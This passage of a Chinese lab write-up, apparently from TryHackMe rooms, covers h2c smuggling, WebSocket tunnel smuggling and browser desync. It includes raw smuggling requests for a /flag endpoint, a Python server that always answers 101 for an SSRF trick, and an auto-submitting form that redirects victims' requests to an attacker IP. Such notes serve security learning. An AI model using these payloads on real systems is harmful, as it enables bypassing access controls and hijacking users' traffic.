<p><strong>HTTPS 服务端</strong></p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> http.server </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> HTTPServer, BaseHTTPRequestHandler</span></span>
<span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> ssl</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 定义服务器地址和端口</span></span>
<span class="line"><span style="color: #ABB2BF">host </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;0.0.0.0&#39;</span></span>
<span class="line"><span style="color: #ABB2BF">port </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">8002</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 1. 创建一个 SSLContext 对象</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># ssl.PROTOCOL_TLS_SERVER 是推荐用于服务器的协议版本，它会自动协商最新的TLS版本</span></span>
<span class="line"><span style="color: #ABB2BF">context </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> ssl.</span><span style="color: #61AFEF">SSLContext</span><span style="color: #ABB2BF">(ssl.</span><span style="color: #D19A66">PROTOCOL_TLS_SERVER</span><span style="color: #ABB2BF">) </span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 2. 加载证书和私钥</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># keyfile 是私钥文件路径，certfile 是证书文件路径</span></span>
<span class="line"><span style="color: #ABB2BF">context.</span><span style="color: #61AFEF">load_cert_chain</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">certfile</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;cert.pem&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75; font-style: italic">keyfile</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;key.pem&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 创建 HTTP 服务器实例</span></span>
<span class="line"><span style="color: #ABB2BF">httpd </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HTTPServer</span><span style="color: #ABB2BF">((host, port), BaseHTTPRequestHandler)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 3. 使用 SSLContext 实例的 .wrap_socket() 方法来包装服务器的套接字</span></span>
<span class="line"><span style="color: #ABB2BF">httpd.socket </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> context.</span><span style="color: #61AFEF">wrap_socket</span><span style="color: #ABB2BF">(httpd.socket, </span><span style="color: #E06C75; font-style: italic">server_side</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">True</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">f</span><span style="color: #98C379">&quot;HTTPS server running on https://</span><span style="color: #D19A66">{</span><span style="color: #ABB2BF">host</span><span style="color: #D19A66">}</span><span style="color: #98C379">:</span><span style="color: #D19A66">{</span><span style="color: #ABB2BF">port</span><span style="color: #D19A66">}</span><span style="color: #98C379">/&quot;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 启动服务器</span></span>
<span class="line"><span style="color: #ABB2BF">httpd.</span><span style="color: #61AFEF">serve_forever</span><span style="color: #ABB2BF">()</span></span></code></pre></div></div></figure>

<p><strong>burp payload</strong></p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">bar</span></span>
<span class="line"><span style="color: #abb2bf">Host: 10.10.161.96:8100</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">GET /static/uploads/myjs.js HTTP/1.1</span></span></code></pre></div></div></figure>

<p>记得在 HTTP&#x2F;2.0 header 里面加一个 <code>pragma: no-cache</code></p>
<p><strong>测试缓存是否生效</strong></p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">curl</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-kv</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">https://10.10.161.96:8100/static/text.js</span></span></code></pre></div></div></figure>

<h2 id="H2c-走私"><a href="#H2c-走私" class="headerlink" title="H2c 走私"></a>H2c 走私</h2><h3 id="HTTP-版本协商"><a href="#HTTP-版本协商" class="headerlink" title="HTTP 版本协商"></a>HTTP 版本协商</h3><p>Web 服务器能够在单个端口上提供多种 HTTP 协议版本。这样做的好处是，它<strong>无需保证</strong>用户浏览器一定支持 HTTP&#x2F;2。通过这种方式，服务器可以同时提供 HTTP&#x2F;1.1 和 HTTP&#x2F;2，客户端则可以自行选择想要使用的版本。这个过程被称为<strong>协议协商（negotiation）</strong>，并且完全由你的浏览器负责处理。</p>
<p>原始的 HTTP&#x2F;2 标准定义了2种方式去协商 HTTP&#x2F;2，取决于双方之间的通信加密了没有。</p>
<ul>
<li><code>h2</code>： 当 HTTP&#x2F;2 运行在 <strong>TLS 加密通道</strong>上时，使用的就是 <code>h2</code> 协议。它依赖于 TLS 的<strong>应用层协议协商 (ALPN)</strong> 机制来提供 HTTP&#x2F;2 服务。</li>
<li><code>h2c</code>： <code>h2c</code> 指的是在<strong>明文通道</strong>上运行的 HTTP&#x2F;2。这通常在没有加密可用的场景下使用。由于 ALPN 是 TLS 的一个特性，因此无法在明文通道中使用它。在这种情况下，客户端会发送一个初始的 <strong>HTTP&#x2F;1.1 请求</strong>，并附加几个特定的头部来<strong>请求升级到 HTTP&#x2F;2</strong>。如果服务器确认并接受这些额外的头部，连接就会成功升级到 HTTP&#x2F;2。</li>
</ul>
<h3 id="升级到-h2c"><a href="#升级到-h2c" class="headerlink" title="升级到 h2c"></a>升级到 h2c</h3><p>当协商建立一个<strong>明文的 HTTP&#x2F;2 连接</strong>时，客户端会发送一个常规的 <strong>HTTP&#x2F;1.1 请求</strong>，其中包含 <code>Upgrade: h2c</code> 头部，以告知服务器它支持 <code>h2c</code>。该请求还必须包含一个额外的 <code>HTTP2-Settings</code> 头部，其中带有我们在此不详细讨论的协商参数。一个符合规范的服务器将以 <code>101 Switching Protocols</code> 响应来接受升级。从那时起，连接就会切换到 HTTP&#x2F;2 协议。</p>
<p>这个其实是用访问合法端点构建起 HTTP&#x2F;2 隧道之后，再用隧道进行访问，从而绕过前端的限制。</p>
<p>这里要用 <a target="_blank" rel="noopener" href="https://github.com/Recopec/h2csmuggler">h2csmuggler</a> 工具，原版要用老版 python 跑，我修改之后支持 python3.14 同时修复了自签证书的问题。</p>
<h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><ul>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/research/http2">HTTP&#x2F;2: The Sequel is Always Worse</a> by James Kettle.</li>
<li><a target="_blank" rel="noopener" href="https://bishopfox.com/blog/h2c-smuggling-request">h2c Smuggling: Request Smuggling Via HTTP&#x2F;2 Cleartext (h2c)</a> by Jake Miller.</li>
</ul>
<h2 id="番外"><a href="#番外" class="headerlink" title="番外"></a>番外</h2><p><strong>为什么 HTTP&#x2F;2 能有效避免 HTTP&#x2F;1.1 中常见的由于连接复用导致的请求走私？</strong></p>
<p>这主要归结于 HTTP&#x2F;2 在协议设计上的根本性改变，尤其是它处理请求和响应边界的方式。</p>
<hr>
<h3 id="HTTP-1-1-走私的根本原因"><a href="#HTTP-1-1-走私的根本原因" class="headerlink" title="HTTP&#x2F;1.1 走私的根本原因"></a>HTTP&#x2F;1.1 走私的根本原因</h3><p>在 HTTP&#x2F;1.1 中，请求走私之所以普遍，是因为存在多种方式来<strong>定义请求体的结束位置</strong>（比如 <code>Content-Length</code> 和 <code>Transfer-Encoding: chunked</code>）。当中间代理服务器和后端服务器对这些定义<strong>解析不一致</strong>时，它们就会对同一个 TCP 连接上的 HTTP 请求边界产生不同的理解。</p>
<p>想象一下，HTTP&#x2F;1.1 就像是发送一连串没有明确分界线的文字，代理和服务器各自揣摩哪句话在哪里结束，这就很容易出错，导致后面的文字被当成了另一句话的开头。</p>
<hr>
<h3 id="HTTP-2-如何解决这个问题"><a href="#HTTP-2-如何解决这个问题" class="headerlink" title="HTTP&#x2F;2 如何解决这个问题"></a>HTTP&#x2F;2 如何解决这个问题</h3><p>HTTP&#x2F;2 从根本上重构了数据传输方式，引入了<strong>二进制分帧层（Binary Framing Layer）</strong>。这就好比 HTTP&#x2F;2 不再发送一连串文字，而是发送一个个<strong>带有明确标签和长度的包裹</strong>。</p>
<p>具体来说，HTTP&#x2F;2 解决了 HTTP&#x2F;1.1 中走私问题的关键点有：</p>
<ol>
<li><strong>精确的长度指示器：</strong> 在 HTTP&#x2F;2 中，所有的 HTTP 消息（包括请求和响应）都被分解成更小的、独立的<strong>二进制帧（frames）</strong>。每个帧都有一个<strong>明确的类型</strong>（例如，HEADERS 帧用于头部，DATA 帧用于请求体）和<strong>精确的长度字段</strong>。<ul>
<li>这意味着，无论是请求头、请求体，还是其他元数据，都被封装在<strong>自带大小信息</strong>的帧中。解析器不再需要依赖 <code>Content-Length</code> 或 <code>Transfer-Encoding</code> 这样的头部来推断请求体的长度，因为数据帧本身就包含了精确的长度信息。</li>
<li>举个例子，一个 HEADERS 帧会明确告诉你它包含多少字节的头部数据，一个 DATA 帧会明确告诉你它包含多少字节的请求体数据。</li>
</ul>
</li>
<li><strong>单一、严格的解析逻辑：</strong> HTTP&#x2F;2 的解析器只遵循这一套严格的<strong>二进制分帧规则</strong>。它不会像 HTTP&#x2F;1.1 那样，在 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 之间进行选择或优先级判断。这种<strong>单一且强制的解析机制</strong>消除了前端代理和后端服务器对请求边界产生歧义的可能性。</li>
<li><strong>连接复用与多路复用：</strong> 尽管 HTTP&#x2F;2 也支持连接复用，但它使用的是<strong>多路复用（Multiplexing）</strong>。这意味着在同一个 TCP 连接上，可以同时传输多个独立的请求和响应。每个请求&#x2F;响应流都有自己的唯一标识符，并且它们的帧可以交错发送，但由于每个帧都带有流 ID 和长度信息，它们在接收端可以被正确地重组。这进一步增强了请求之间的隔离性，降低了相互干扰的风险。</li>
</ol>
<h1 id="Request-Smuggling-WebSockets"><a href="#Request-Smuggling-WebSockets" class="headerlink" title="Request Smuggling: WebSockets"></a>Request Smuggling: WebSockets</h1><p>这个房间本质上还是利用 HTTP 的漏洞，只不过是利用了协议升级，前后端服务器存在的行为不一致的问题。</p>
<h2 id="从-HTTP-升级到-Websockets"><a href="#从-HTTP-升级到-Websockets" class="headerlink" title="从 HTTP 升级到 Websockets"></a>从 HTTP 升级到 Websockets</h2><p>客户端发起一个 HTTP 请求，其中包含 <code>Upgrade: websocket</code> 头部。如果服务器支持 WebSocket 协议，它就会回复 <code>101 Switching Protocols</code> 响应，并相应地升级该连接。从那一刻起，连接将使用 WebSocket 协议而非 HTTP 协议。</p>
<p>如果你在中间引入一个代理，情况就会变得有趣起来：大多数代理服务器不会亲自处理 WebSocket 升级请求，而是<strong>将其直接转发给后端服务器</strong>。一旦连接成功升级，代理就会在客户端和后端服务器之间<strong>建立一条隧道</strong>。这样一来，所有后续的 WebSocket 流量都将不受干扰地直接转发到后端服务器。</p>
<p>我们现在面临的问题是，这条隧道使用的是 WebSocket 协议而非 HTTP。如果此时我们尝试利用这条隧道来走私一个 HTTP 请求，后端服务器将会拒绝它，因为它此时正期待接收 WebSocket 请求。</p>
<p>那我们能不能让代理服务器到后端服务器的连接不升级呢？或者是能不能让代理服务器误认为这个连接升级，然后建立起这个隧道。</p>
<h2 id="通过有缺陷的-WebSocket-隧道走私-HTTP-请求"><a href="#通过有缺陷的-WebSocket-隧道走私-HTTP-请求" class="headerlink" title="通过有缺陷的 WebSocket 隧道走私 HTTP 请求"></a>通过有缺陷的 WebSocket 隧道走私 HTTP 请求</h2><p>为了通过一个有漏洞的代理服务器走私请求，我们可以创建一个畸形请求，让代理服务器误认为正在执行 WebSocket 升级，但后端服务器实际上并没有升级连接。这将迫使代理在客户端和服务器之间建立一个隧道，由于代理假设这已是一个 WebSocket 连接，因此它不会再检查隧道内的流量，而后端服务器却仍然期望接收 HTTP 流量。</p>
<p>强制实现（即让代理建立一个未检查的隧道，而后端仍期望 HTTP 流量）的一种方法是，发送一个带有无效 <code>Sec-WebSocket-Version</code> 头部的升级请求。但是后端会发一个 <code>426 Upgrade Required</code> 响应去表示这个升级是不成功的。</p>
<p>一般 <code>Sec-WebSocket-Version</code> 是 13，我们可以填一个高于这个版本的就行。</p>
<p>但是某些代理会不管后端服务器的响应，假定这个升级是始终完成的。然后这个<strong>假的</strong> WebSocket 隧道就建立起来了，我们就可以往里面发送 HTTP 请求了。 </p>
<p>但是这个技巧不会去污染别的用户的请求，所以我们只能用来绕过前端的一些请求限制。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET /socket HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">Host: MACHINE_IP:8001</span></span>
<span class="line"><span style="color: #abb2bf">Sec-WebSocket-Version: 777</span></span>
<span class="line"><span style="color: #abb2bf">Upgrade: WebSocket</span></span>
<span class="line"><span style="color: #abb2bf">Connection: Upgrade</span></span>
<span class="line"><span style="color: #abb2bf">Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">GET /flag HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">Host: MACHINE_IP:8001</span></span></code></pre></div></div></figure>

<h2 id="绕过代理限制"><a href="#绕过代理限制" class="headerlink" title="绕过代理限制"></a>绕过代理限制</h2><p>跟着 Room 走就行，我用的 Payload 如下，注意最后有两个回车，还有记得取消 Update Content-Length。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET /socket HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">Host: MACHINE_IP:8001</span></span>
<span class="line"><span style="color: #abb2bf">Sec-WebSocket-Version: 777</span></span>
<span class="line"><span style="color: #abb2bf">Upgrade: WebSocket</span></span>
<span class="line"><span style="color: #abb2bf">Connection: Upgrade</span></span>
<span class="line"><span style="color: #abb2bf">Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">GET /flag HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">Host: MACHINE_IP:8001</span></span></code></pre></div></div></figure>

<p>如果失败的话，可以用 nc 发请求，一样的。</p>
<h2 id="绕过”安全“的代理"><a href="#绕过”安全“的代理" class="headerlink" title="绕过”安全“的代理"></a>绕过”安全“的代理</h2><p>某些代理会检验后端是否发送了成功升级的请求，如果没有，就不升级连接。但是我们可以通过 SSRF 来实现这点。</p>
<p>下面是一个会始终发送 <code>101 Switching Protocols</code> 响应的代码，我们通过 SSRF，导致后端会回显这个响应，欺骗代理服务器连接已经建立了，建立起 WebSocket 隧道。</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> sys</span></span>
<span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> http.server </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> HTTPServer, BaseHTTPRequestHandler</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(sys.argv)</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;&quot;&quot;</span></span>
<span class="line"><span style="color: #98C379">Usage: </span><span style="color: #D19A66">{}</span><span style="color: #98C379"> </span></span>
<span class="line"><span style="color: #98C379">    &quot;&quot;&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">format</span><span style="color: #ABB2BF">(sys.argv[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">]))</span></span>
<span class="line"><span style="color: #ABB2BF">    sys.</span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Redirect</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">BaseHTTPRequestHandler</span><span style="color: #ABB2BF">):</span></span>
<span class="line"><span style="color: #ABB2BF">   </span><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">do_GET</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B; font-style: italic">self</span><span style="color: #ABB2BF">):</span></span>
<span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.protocol_version </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HTTP/1.1&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">send_response</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">101</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">end_headers</span><span style="color: #ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">HTTPServer</span><span style="color: #ABB2BF">((</span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">int</span><span style="color: #ABB2BF">(sys.argv[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])), Redirect).</span><span style="color: #61AFEF">serve_forever</span><span style="color: #ABB2BF">()</span></span></code></pre></div></div></figure>

<p>前端用的 Payload 如下</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET /check-url?server=http://10.11.141.2:5555 HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">Host: 10.10.12.34:8002</span></span>
<span class="line"><span style="color: #abb2bf">Sec-WebSocket-Version: 13</span></span>
<span class="line"><span style="color: #abb2bf">Upgrade: WebSocket</span></span>
<span class="line"><span style="color: #abb2bf">Connection: Upgrade</span></span>
<span class="line"><span style="color: #abb2bf">Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">GET /flag HTTP/1.1</span></span>
<span class="line"><span style="color: #abb2bf">Host: 10.10.12.34:8002</span></span></code></pre></div></div></figure>

<h2 id="推荐阅读-1"><a href="#推荐阅读-1" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/0ang3el/websocket-smuggle">https://github.com/0ang3el/websocket-smuggle</a></li>
</ul>
<h1 id="HTTP-Browser-Desync"><a href="#HTTP-Browser-Desync" class="headerlink" title="HTTP Browser Desync"></a>HTTP Browser Desync</h1><p>利用 HTTP Keep-Alive 特性，一个请求不会实际上关闭这个连接，在一个 POST 请求后面拼接一些构造好的请求。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/Web_Application_Pentesting.assets/298d76a6f0bdc20abdd69a78516f1a46.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;63c131e50a24c3005eb34678&#x2F;room-content&#x2F;298d76a6f0bdc20abdd69a78516f1a46.png" data-caption="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;63c131e50a24c3005eb34678&#x2F;room-content&#x2F;298d76a6f0bdc20abdd69a78516f1a46.png" loading="lazy"></p>
<p>具体场景的我不太清楚怎么做，但是在下一个 Task 带着我们做了这一点，在页面刷新之后会跳转到构造好的那个端点里面。</p>
<p>这个是用来测试网页是否存在去同步漏洞的 Payload。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">fetch(&#39;http://MACHINE_IP:5000/&#39;, {</span></span>
<span class="line"><span style="color: #abb2bf">    method: &#39;POST&#39;,</span></span>
<span class="line"><span style="color: #abb2bf">    body: &#39;GET /redirect HTTP/1.1\r\nFoo: x&#39;,</span></span>
<span class="line"><span style="color: #abb2bf">    mode: &#39;cors&#39;,</span></span>
<span class="line"><span style="color: #abb2bf">})</span></span></code></pre></div></div></figure>

<p>就相当于下一条请求是请求 &#x2F;redirect 这个 URL。不管实际上请求的是啥，具体的 HTTP 包可以看上面👆那个图。</p>
<h2 id="HTTP-浏览器去同步漏洞链-XSS"><a href="#HTTP-浏览器去同步漏洞链-XSS" class="headerlink" title="HTTP 浏览器去同步漏洞链 XSS"></a>HTTP 浏览器去同步漏洞链 XSS</h2><p>Payload 如下</p>
<figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">form</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;btn&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">action</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://challenge.thm/&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">method</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;POST&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">enctype</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;text/plain&quot;</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">textarea</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">name</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;GET http://YOUR_IP HTTP/1.1</span></span>
<span class="line"><span style="color: #98C379">AAA: A&quot;</span><span style="color: #ABB2BF">&gt;placeholder1&lt;/</span><span style="color: #E06C75">textarea</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">button</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">type</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;submit&quot;</span><span style="color: #ABB2BF">&gt;placeholder2&lt;/</span><span style="color: #E06C75">button</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">form</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E5C07B">btn</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">submit</span><span style="color: #ABB2BF">() &lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>

<p>注意这里 enctype 是 text&#x2F;plain，他会将表单字段的 <code>name</code> 属性和 <code>value</code> 属性<strong>原样拼接</strong>，并且使用<strong>换行符 (<code>\r\n</code>)</strong> 作为不同字段之间的分隔符。然后实际的请求体是：</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET http://YOUR_IP HTTP/1.1\r\nAAA: A=placeholder1</span></span></code></pre></div></div></figure>

<p>页面加载之后，这个表单会自动提交，无须用户点击。</p>
<h2 id="挑战-1"><a href="#挑战-1" class="headerlink" title="挑战"></a>挑战</h2><p>给了我们一个页面，其实这个可以直接用 XSS 偷出来，但是题目给的 wp 是用了去同步 + XSS，下面是用到的一些 Payload。</p>
<p>前端用的 XSS</p>
<figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">form</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;btn&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">action</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://challenge.thm/&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">method</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;POST&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">enctype</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;text/plain&quot;</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">textarea</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">name</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;GET http://10.11.141.2:1337 HTTP/1.1</span></span>
<span class="line"><span style="color: #98C379">AAA: A&quot;</span><span style="color: #ABB2BF">&gt;placeholder1&lt;/</span><span style="color: #E06C75">textarea</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">button</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">type</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;submit&quot;</span><span style="color: #ABB2BF">&gt;placeholder2&lt;/</span><span style="color: #E06C75">button</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">form</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E5C07B">btn</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">submit</span><span style="color: #ABB2BF">() &lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>

<p>发送 Payload 的服务器</p>
